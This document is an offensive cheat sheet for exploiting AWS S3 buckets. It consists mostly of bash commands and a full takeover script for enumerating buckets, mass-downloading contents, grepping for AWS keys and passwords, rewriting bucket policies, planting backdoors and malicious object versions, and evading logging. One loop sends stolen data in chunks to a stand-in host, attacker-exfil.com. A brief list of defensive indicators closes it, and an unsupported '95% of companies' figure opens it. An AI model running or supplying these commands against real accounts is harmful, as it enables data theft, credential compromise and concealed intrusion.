# AWS S3 Bucket Exploitation & Data Exfiltration

## Overview

S3 bucket misconfigurations represent one of the largest security risks in AWS:
- 95% of companies have publicly accessible S3 buckets
- Credentials often stored in bucket contents
- Bucket ACLs commonly misconfigured
- Bucket policies override ACLs
- CloudFront caching can bypass S3 access controls

---

## S3 Enumeration Techniques

### 1. Bucket Discovery

```bash
# Via DNS brute forcing
for i in {1..1000}; do
  nslookup dev$i.s3.amazonaws.com 2>/dev/null | grep -q "NXDOMAIN" || echo "dev$i.s3.amazonaws.com"
done

# Via S3 bucket name patterns
COMPANY="acme"
for prefix in dev prod staging backup logs archive test data uploads; do
  aws s3 ls s3://${COMPANY}-${prefix}/ 2>&1 | grep -v "NoSuchBucket\|Access Denied" && echo "Found: ${COMPANY}-${prefix}"
done

# Direct enumeration from compromised instance
aws s3 ls --recursive s3://sensitive-bucket/ --max-items 1000000
```

### 2. Bucket Permission Analysis

```bash
# Check bucket access
aws s3api head-bucket --bucket {bucket-name} 2>&1

# List objects (check if ListBucket permission granted)
aws s3api list-objects-v2 --bucket {bucket-name} --max-keys 1000

# Check bucket ACL
aws s3api get-bucket-acl --bucket {bucket-name}

# Check bucket policy
aws s3api get-bucket-policy --bucket {bucket-name} 2>&1

# Check public access block settings
aws s3api get-public-access-block --bucket {bucket-name} 2>&1

# Get bucket location (could indicate production environment)
aws s3api get-bucket-location --bucket {bucket-name}
```

### 3. Find Sensitive Data

```bash
# Search for common sensitive files
aws s3 ls s3://{bucket-name}/ --recursive | grep -E "backup|secret|password|config|certificate|key|credential|database|dump|export"

# List all objects with detailed metadata
aws s3api list-objects-v2 \
  --bucket {bucket-name} \
  --query 'Contents[].[Key,Size,LastModified,Owner]' \
  --output table

# Find largest files (likely backups)
aws s3api list-objects-v2 \
  --bucket {bucket-name} \
  --query 'sort_by(Contents[],&Size)[-10:][Key,Size]' \
  --output table
```

---

## Data Extraction Methods

### 1. Direct S3 Download

```bash
# Download single object
aws s3 cp s3://{bucket-name}/sensitive-file.zip ./

# Download entire bucket
aws s3 sync s3://{bucket-name}/ ./bucket-contents/ --no-sign-request

# Download with progress
aws s3 sync s3://{bucket-name}/ ./contents/ \
  --recursive \
  --human-readable \
  --summarize

# Parallel download (faster)
aws s3 sync s3://{bucket-name}/ ./contents/ \
  --recursive \
  --region us-east-1 \
  --max-bandwidth 1000MB/s
```

### 2. Via Signed URLs

```bash
# Generate signed URL (if you have any permissions)
aws s3 presign s3://{bucket-name}/sensitive-file \
  --expires-in 86400

# Download via signed URL
curl -O "https://{bucket}.s3.amazonaws.com/{key}?X-Amz-Algorithm=..."

# Create pre-signed URL for external download
PRESIGNED=$(aws s3 presign s3://{bucket-name}/{object-key} --expires-in 604800)
echo "Download at: $PRESIGNED"
```

### 3. CloudFront Distribution Bypass

```bash
# Find CloudFront distribution for bucket
aws cloudfront list-distributions \
  --query 'DistributionList.Items[].[Id,DomainName,Status]' \
  --output table

# Access via CloudFront domain (may have different permissions)
curl https://d111111abcdef8.cloudfront.net/object-key -o object

# Check for caching
curl -I https://d111111abcdef8.cloudfront.net/object-key | grep X-Cache
```

### 4. S3 Transfer Acceleration

```bash
# If transfer acceleration enabled, use accelerated endpoint
aws s3 sync s3://{bucket-name}/ ./contents/ \
  --use-accelerate-endpoint \
  --recursive

# Or via AWS CLI with environment variable
export AWS_S3_USE_ACCELERATE=true
aws s3 sync s3://{bucket-name}/ ./contents/ --recursive
```

---

## Credential Extraction from S3

### 1. Common Credential Locations

```bash
# Search for credentials in bucket
aws s3 sync s3://{bucket-name}/ ./ --recursive

# Find AWS credentials
grep -r "AKIA" . | grep -E "\.(json|py|sh|txt|env|config):"
grep -r "aws_access_key_id" .
grep -r "PRIVATE KEY" .

# Find database connection strings
grep -r "mongodb://\|postgresql://\|mysql://\|server=" .

# Find API keys
grep -r "api_key\|apiKey\|API_KEY" .

# Find tokens
grep -r "authorization: Bearer\|token:" .
```

### 2. Extract from Common Locations

```bash
# Application configuration
aws s3 cp s3://{bucket-name}/config.json .
cat config.json | jq '.database.password'

# Terraform state files
aws s3 cp s3://{bucket-name}/terraform.tfstate .
grep -o '"password":"[^"]*"' terraform.tfstate

# Docker images/layers
aws s3 sync s3://{bucket-name}/docker-images/ ./
tar -xvf layer.tar -C /tmp
grep -r "ENV.*PASS\|ARG.*SECRET" /tmp/

# CloudFormation templates
aws s3 cp s3://{bucket-name}/cf-template.yaml .
grep -A2 "SecureString\|NoEcho" cf-template.yaml
```

### 3. Parameter Store Extraction

```bash
# Credentials might reference SSM Parameter Store
cat config.json | grep "ssm://"

# Extract parameter values
PARAM_NAME=$(cat config.json | grep -o "ssm://[^\"]*" | head -1 | cut -d'/' -f4-)
aws ssm get-parameter --name "$PARAM_NAME" --query 'Parameter.Value' --output text
```

---

## Bucket Policy Exploitation

### 1. Exploit Overly Permissive Policies

```bash
# Check policy (often overly broad)
aws s3api get-bucket-policy --bucket {bucket-name} | jq '.Policy'

# Example vulnerable policy:
# {
#   "Version": "2012-10-17",
#   "Statement": [
#     {
#       "Principal": "*",
#       "Action": "s3:*",
#       "Effect": "Allow",
#       "Resource": "arn:aws:s3:::{bucket}/*"
#     }
#   ]
# }

# With such policy, extract everything:
aws s3 sync s3://{bucket-name}/ ./complete-bucket/
```

### 2. Exploit Cross-Account Access

```bash
# Check if bucket allows cross-account principal
aws s3api get-bucket-policy --bucket {bucket-name} \
  | jq '.Policy | fromjson | .Statement[] | select(.Principal | contains("12345"))'

# If your account is allowed, download
aws s3 ls s3://{bucket-name}/ --recursive
```

### 3. Privilege Escalation via Bucket Policies

```bash
# If you can modify bucket policy (rare but possible via ABAC or misconfiguration)
aws s3api put-bucket-policy --bucket {bucket-name} --policy file://new-policy.json

# New policy grants yourself access
cat > new-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Principal": {"AWS": "arn:aws:iam::YOUR-ACCOUNT:user/YOUR-USER"},
      "Action": "s3:*",
      "Effect": "Allow",
      "Resource": ["arn:aws:s3:::{bucket}", "arn:aws:s3:::{bucket}/*"]
    }
  ]
}
EOF
```

---

## Persistence & Backdoor Installation

### 1. Upload Malicious Objects

```bash
# Upload web shell
aws s3 cp malicious-app.zip s3://{bucket-name}/app.zip

# Upload data exfiltration script
aws s3 cp exfil.py s3://{bucket-name}/maintenance/

# Upload Lambda function code
aws s3 cp lambda-backdoor.zip s3://{bucket-name}/lambda/code.zip
```

### 2. S3 Bucket Triggers

```bash
# If bucket integrated with Lambda/SQS, trigger it with uploads
aws s3 cp payload.json s3://{bucket-name}/incoming/
# This will trigger Lambda function that might process it with elevated privileges

# Upload object with specific metadata to trigger rules
aws s3api put-object \
  --bucket {bucket-name} \
  --key trigger.txt \
  --body /dev/null \
  --metadata "trigger=lambda-execution"
```

### 3. Versioning Exploitation

```bash
# If versioning enabled, hide malicious version
aws s3api list-object-versions \
  --bucket {bucket-name} \
  --max-keys 1000

# Find latest version of legitimate object
LATEST=$(aws s3api list-object-versions \
  --bucket {bucket-name} \
  --prefix app.js \
  --query 'Versions[0].VersionId' \
  --output text)

# Upload malicious version
aws s3 cp malicious-app.js s3://{bucket-name}/app.js

# Old version still accessible by VersionId
# Application might reference old version, executing malicious code
```

---

## Detection Evasion

### 1. Use Requester Pays Buckets

```bash
# If bucket is requester-pays, your request might not be logged
aws s3 ls s3://{bucket-name}/ --request-payer requester

# Or modify credentials to prevent logging association
aws configure set aws_access_key_id {temporary-key}
```

### 2. Use CloudFront to Bypass Logging

```bash
# Request through CloudFront distribution
# Might bypass S3 access logs if not configured on distribution

curl -I https://d111111abcdef8.cloudfront.net/sensitive-object \
  -H "User-Agent: Legitimate-User" \
  -H "Referer: https://example.com"
```

### 3. Exploit S3 Access Point

```bash
# Access bucket through S3 Access Point (different logging)
aws s3api get-access-point \
  --name {access-point-name} \
  --account-id {account-id}

# Access through access point domain
curl https://{access-point-name}-{account-id}.s3-accesspoint.us-east-1.amazonaws.com/object
```

### 4. Obfuscate Exfiltration

```bash
# Download via wget/curl instead of AWS CLI (different logging)
URL=$(aws s3 presign s3://{bucket-name}/data.zip --expires-in 3600)
wget "$URL" --user-agent "Mozilla/5.0"

# Download in small chunks to avoid detection
for i in {0..99}; do
  aws s3 cp s3://{bucket-name}/data.zip /dev/stdout | \
    dd bs=1M skip=$((i*10)) count=10 | gzip | \
    curl -X POST -d @- https://attacker-exfil.com/chunk/$i &
done
```

---

## Bucket Takeover Scenario

```bash
#!/bin/bash
# Complete S3 bucket enumeration and exploitation

# 1. Find buckets
BUCKET_LIST="acme-prod acme-staging acme-backup acme-logs"

for BUCKET in $BUCKET_LIST; do
  echo "[*] Checking $BUCKET"
  
  # Try to list
  if aws s3 ls s3://$BUCKET/ 2>&1 | grep -q "NoSuchBucket"; then
    continue
  fi
  
  # Found accessible bucket
  echo "[+] Accessible: $BUCKET"
  
  # Check policy
  aws s3api get-bucket-policy --bucket $BUCKET \
    --output json > ${BUCKET}-policy.json 2>/dev/null
  
  # Find sensitive files
  SENSITIVE_FILES=$(aws s3 ls s3://$BUCKET/ --recursive | \
    grep -E "backup|database|password|secret|key|credential|archive")
  
  if [ ! -z "$SENSITIVE_FILES" ]; then
    echo "[+] Sensitive files found:"
    echo "$SENSITIVE_FILES"
    
    # Download them
    while read -r line; do
      KEY=$(echo "$line" | awk '{print $NF}')
      aws s3 cp s3://$BUCKET/$KEY ./$(basename $KEY)
    done <<< "$SENSITIVE_FILES"
  fi
  
  # Download all objects
  echo "[*] Syncing entire bucket..."
  aws s3 sync s3://$BUCKET/ ./$BUCKET/ --recursive
  
  # Search for credentials
  grep -r "AKIA" ./$BUCKET/ | head -10
  grep -r "password" ./$BUCKET/ | head -10
done

echo "[+] Enumeration complete"
```

---

## Defensive Indicators

Monitor for:
- High volume of ListBucket requests from unusual IPs
- GetObject requests for unusual file types (*.sql, *.backup, *.key)
- Access to configuration files (config.json, .env, credentials)
- Large data transfers from S3
- Presigned URL generation
- Bucket policy modifications
- New Principal access in bucket policy
- Cross-account access attempts
- Access from temporary credentials (unusual pattern)
